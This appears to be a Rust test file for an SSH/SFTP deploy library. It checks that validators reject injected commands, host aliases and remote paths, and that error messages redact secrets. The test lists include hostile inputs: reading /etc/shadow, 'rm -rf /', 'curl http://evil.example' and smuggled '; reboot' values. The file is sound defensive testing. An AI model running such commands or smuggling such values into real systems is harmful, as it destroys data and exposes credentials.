//! Cross-cutting abuse tests for the VPS plan surfaces: exec, upload, and
//! the facade accessors, exercised together through the public API a
//! downstream deploy tool would call.

#[cfg(feature = "exec")]
mod exec_family {
    use toride_runner::fake::FakeRunner;
    use toride_ssh::exec::{CommandOutput, Error as ExecError, ExecService};
    use toride_ssh::{Error as CoreError, HostKeyPolicy, HostSpec};

    const HOST_KEY_BANNER: &str = concat!(
        "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n",
        "@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\n",
        "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n",
        "Host key verification failed.\n",
    );

    fn host() -> HostSpec {
        HostSpec::parse("root@203.0.113.10").unwrap()
    }

    #[test]
    fn shell_string_command_elements_are_rejected_with_the_typed_variant() {
        let fake = FakeRunner::new();
        let service = ExecService::new(Box::new(fake.clone()));
        for shell_line in [
            "systemctl restart toride && systemctl is-active toride",
            "uptime; id",
            "$(reboot)",
            "`cat /etc/shadow`",
            "echo pwned | tee /etc/issue",
            "rm -rf / > /dev/null",
        ] {
            match service.run(&host(), &[shell_line]) {
                Err(ExecError::InvalidRemoteCommand { .. }) => {}
                other => panic!("{shell_line:?}: expected InvalidRemoteCommand, got {other:?}"),
            }
        }
        assert!(
            fake.calls().is_empty(),
            "no invocation may reach the runner for a rejected element"
        );
    }

    #[test]
    fn untrusted_host_aliases_are_rejected_with_the_typed_core_variant() {
        let fake = FakeRunner::new().push_response(CommandOutput::from_stdout("ok"));
        let service = ExecService::new(Box::new(fake.clone()));
        for alias in [
            "-oProxyCommand=evil",
            "root@203.0.113.10;reboot",
            "$(curl http://evil.example)",
            "root@",
            "root@-host.example.org",
            "vps example.org",
        ] {
            match HostSpec::parse(alias) {
                Err(CoreError::InvalidHost(_)) => {}
                other => panic!("{alias:?}: expected InvalidHost, got {other:?}"),
            }
        }
        service.run(&host(), &["uptime"]).unwrap();
        assert_eq!(
            fake.calls().len(),
            1,
            "only the validated host may reach ssh"
        );
    }

    #[test]
    fn canned_255_host_key_failure_surfaces_as_the_typed_host_key_error() {
        let fake =
            FakeRunner::new().push_response(CommandOutput::from_stderr(HOST_KEY_BANNER, 255));
        let service = ExecService::new(Box::new(fake));
        match service.run(&host(), &["uptime"]).unwrap_err() {
            ExecError::Core(CoreError::HostKeyVerificationFailed(_)) => {}
            other => panic!("expected HostKeyVerificationFailed, got {other:?}"),
        }
    }

    #[test]
    fn exact_ssh_argv_carries_the_host_key_option_for_both_policies() {
        for policy in [HostKeyPolicy::Strict, HostKeyPolicy::AcceptNew] {
            let fake = FakeRunner::new().push_response(CommandOutput::from_stdout("active"));
            let service = ExecService::new(Box::new(fake.clone())).with_host_key_policy(policy);
            service
                .run(&host(), &["systemctl", "is-active", "toride-web"])
                .unwrap();

            let calls = fake.calls();
            assert_eq!(calls.len(), 1, "{policy:?}: expected one invocation");
            assert_eq!(calls[0].program, "ssh", "{policy:?}");
            assert_eq!(
                calls[0].args,
                vec![
                    "-o",
                    "BatchMode=yes",
                    "-o",
                    policy.ssh_option(),
                    "root@203.0.113.10",
                    "systemctl",
                    "is-active",
                    "toride-web",
                ],
                "{policy:?}"
            );
            assert!(
                calls[0].args.iter().all(|arg| !arg.contains(' ')),
                "{policy:?}: no argument may be a joined shell line: {:?}",
                calls[0].args
            );
            assert!(
                !calls[0].args.contains(&"-c".to_owned()),
                "{policy:?}: argv must not invoke a shell"
            );
            assert!(
                calls[0].stdin_null,
                "{policy:?}: ssh must not inherit stdin"
            );
            assert!(
                calls[0].redact,
                "{policy:?}: the spec must opt into redaction"
            );
        }
    }
}

#[cfg(feature = "upload")]
mod upload_family {
    use std::fs;

    use toride_runner::fake::FakeRunner;
    use toride_ssh::upload::{CommandOutput, Error as UploadError, RemotePath, UploadService};
    use toride_ssh::{Error as CoreError, HostKeyPolicy, HostSpec};

    const HOST_KEY_BANNER: &str = concat!(
        "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n",
        "@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\n",
        "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n",
        "Host key verification failed.\n",
    );

    fn host() -> HostSpec {
        HostSpec::parse("root@203.0.113.10").unwrap()
    }

    fn remote() -> RemotePath {
        RemotePath::parse("/etc/toride/app.conf").unwrap()
    }

    fn payload() -> tempfile::NamedTempFile {
        let file = tempfile::NamedTempFile::new().unwrap();
        fs::write(file.path(), b"toride vps family payload").unwrap();
        file
    }

    #[test]
    fn invalid_remote_paths_are_rejected_with_the_typed_variant() {
        let file = payload();
        let fake = FakeRunner::new().push_response(CommandOutput::from_stdout(""));
        let service = UploadService::new(Box::new(fake.clone()));
        for bad in [
            "/etc/toride/app.conf;touch /tmp/pwned",
            "/etc/toride/app.conf && reboot",
            "/etc/toride/new\nline",
            "/etc/toride/with space",
            "/etc/toride/glob*.conf",
            "-oProxyCommand=evil",
            "etc/toride/relative.conf",
            "",
        ] {
            match RemotePath::parse(bad) {
                Err(UploadError::InvalidRemotePath { .. }) => {}
                other => panic!("{bad:?}: expected InvalidRemotePath, got {other:?}"),
            }
        }
        service
            .upload(&host(), file.path(), &remote())
            .unwrap_or_else(|err| panic!("the clean upload must succeed: {err}"));
        assert_eq!(
            fake.calls().len(),
            1,
            "only the clean upload may reach sftp"
        );
    }

    #[test]
    fn untrusted_hosts_are_rejected_with_the_typed_core_variant() {
        let file = payload();
        let fake = FakeRunner::new().push_response(CommandOutput::from_stdout(""));
        let service = UploadService::new(Box::new(fake.clone()));
        for alias in [
            "-oProxyCommand=evil",
            "root@203.0.113.10;reboot",
            "$(curl http://evil.example)",
            "root@",
            "vps example.org",
        ] {
            match HostSpec::parse(alias) {
                Err(CoreError::InvalidHost(_)) => {}
                other => panic!("{alias:?}: expected InvalidHost, got {other:?}"),
            }
        }
        service
            .upload(&host(), file.path(), &remote())
            .unwrap_or_else(|err| panic!("the clean upload must succeed: {err}"));
        let calls = fake.calls();
        assert_eq!(calls.len(), 1, "only the validated host may reach sftp");
        assert_eq!(
            calls[0].args.last(),
            Some(&"root@203.0.113.10".to_owned()),
            "the host destination must be the final operand"
        );
    }

    #[test]
    fn canned_255_host_key_violation_surfaces_as_the_typed_host_key_error() {
        let file = payload();
        let fake =
            FakeRunner::new().push_response(CommandOutput::from_stderr(HOST_KEY_BANNER, 255));
        let service = UploadService::new(Box::new(fake));
        match service.upload(&host(), file.path(), &remote()).unwrap_err() {
            UploadError::Core(CoreError::HostKeyVerificationFailed(_)) => {}
            other => panic!("expected HostKeyVerificationFailed, got {other:?}"),
        }
    }

    #[test]
    fn batch_argv_discipline_holds_for_both_policies() {
        for policy in [HostKeyPolicy::Strict, HostKeyPolicy::AcceptNew] {
            let file = payload();
            let fake = FakeRunner::new().push_response(CommandOutput::from_stdout(""));
            let service = UploadService::new(Box::new(fake.clone())).with_host_key_policy(policy);
            service
                .upload(&host(), file.path(), &remote())
                .unwrap_or_else(|err| panic!("{policy:?}: the upload must succeed: {err}"));

            let calls = fake.calls();
            assert_eq!(calls.len(), 1, "{policy:?}: expected one invocation");
            let spec = &calls[0];
            assert_eq!(spec.program, "sftp", "{policy:?}");
            assert_eq!(
                &spec.args[..5],
                ["-o", "BatchMode=yes", "-o", policy.ssh_option(), "-b"],
                "{policy:?}: batch mode and host-key options must lead the argv"
            );
            assert_eq!(spec.args.len(), 7, "{policy:?}: {spec:?}");
            assert_eq!(
                spec.args.last(),
                Some(&"root@203.0.113.10".to_owned()),
                "{policy:?}: the host destination must be the final operand"
            );
            let batch_path = &spec.args[5];
            assert!(
                batch_path.starts_with('/') && !batch_path.contains(' '),
                "{policy:?}: the batch file must be one absolute path element: {batch_path}"
            );
            assert!(
                !spec.args.contains(&"-c".to_owned()),
                "{policy:?}: argv must not invoke a shell"
            );
            assert!(spec.stdin_null, "{policy:?}: sftp must not inherit stdin");
            assert!(spec.redact, "{policy:?}: the spec must opt into redaction");
        }
    }
}

#[cfg(any(feature = "exec", feature = "upload"))]
mod no_leak_family {
    use toride_runner::display::display_command;
    use toride_runner::fake::FakeRunner;
    use toride_ssh::HostSpec;

    const PAYLOAD_MARKER: &str = "toride-payload-marker-5f3a";

    fn host() -> HostSpec {
        HostSpec::parse("root@203.0.113.10").unwrap()
    }

    #[cfg(feature = "exec")]
    #[test]
    fn exec_failure_diagnostics_never_carry_the_payload_marker() {
        use toride_ssh::exec::{CommandOutput, Error as ExecError, ExecService};

        let fake = FakeRunner::new().push_response(CommandOutput::from_stderr(
            "deploy failed: toride-payload-marker-5f3a rejected by registry\n",
            1,
        ));
        let service = ExecService::new(Box::new(fake.clone()));
        let error = service
            .run(&host(), &["deploy", "--token", PAYLOAD_MARKER])
            .unwrap_err();
        let rendered = error.to_string();
        assert!(
            matches!(error, ExecError::RemoteCommandFailed { .. }),
            "expected RemoteCommandFailed, got {rendered}"
        );
        assert!(
            !rendered.contains(PAYLOAD_MARKER),
            "formatted error leaked the payload marker: {rendered}"
        );
        let display = display_command(&fake.calls()[0], &[]);
        assert!(
            display.contains("***"),
            "the recorded command display must redact the token slot: {display}"
        );
        assert!(
            !display.contains(PAYLOAD_MARKER),
            "recorded command display leaked the payload marker: {display}"
        );
    }

    #[cfg(feature = "upload")]
    #[test]
    fn upload_failure_diagnostics_never_carry_paths_nor_payload_marker() {
        use std::fs;
        use toride_ssh::upload::{CommandOutput, Error as UploadError, RemotePath, UploadService};

        let file = tempfile::NamedTempFile::new().unwrap();
        fs::write(file.path(), PAYLOAD_MARKER.as_bytes()).unwrap();
        let local_canonical = fs::canonicalize(file.path()).unwrap();
        let local_text = local_canonical.to_string_lossy().into_owned();
        let remote = RemotePath::parse("/etc/toride/sekrit-vps-target.env").unwrap();

        let stderr = format!(
            "sftp: put {local_text} /etc/toride/sekrit-vps-target.env: Permission denied\n"
        );
        let fake = FakeRunner::new().push_response(CommandOutput::from_stderr(stderr, 1));
        let service = UploadService::new(Box::new(fake.clone()));
        let error = service.upload(&host(), file.path(), &remote).unwrap_err();
        let rendered = error.to_string();
        assert!(
            matches!(error, UploadError::UploadFailed { .. }),
            "expected UploadFailed, got {rendered}"
        );
        assert!(
            !rendered.contains("sekrit-vps-target") && !rendered.contains("/etc/toride"),
            "formatted error leaked the remote path: {rendered}"
        );
        assert!(
            !rendered.contains(&local_text),
            "formatted error leaked the local payload path: {rendered}"
        );
        assert!(
            !rendered.contains(PAYLOAD_MARKER),
            "formatted error leaked the payload marker: {rendered}"
        );

        let display = display_command(&fake.calls()[0], &[]);
        assert!(
            !display.contains("sekrit-vps-target") && !display.contains("/etc/toride"),
            "recorded command display leaked the remote path: {display}"
        );
        assert!(
            !display.contains(PAYLOAD_MARKER),
            "recorded command display leaked the payload marker: {display}"
        );
    }
}

#[cfg(all(feature = "exec", feature = "upload"))]
mod facade_smoke {
    use toride_ssh::{HostKeyPolicy, SshManager};

    #[test]
    fn accessors_construct_services_without_spawning() {
        let manager = SshManager::new().unwrap_or_else(|err| panic!("SshManager::new: {err}"));
        let exec_service = manager.exec();
        assert_eq!(exec_service.ssh_program(), "ssh");
        assert_eq!(exec_service.host_key_policy(), HostKeyPolicy::Strict);
        let upload_service = manager.upload();
        assert_eq!(upload_service.sftp_program(), "sftp");
        assert_eq!(upload_service.host_key_policy(), HostKeyPolicy::Strict);
    }
}
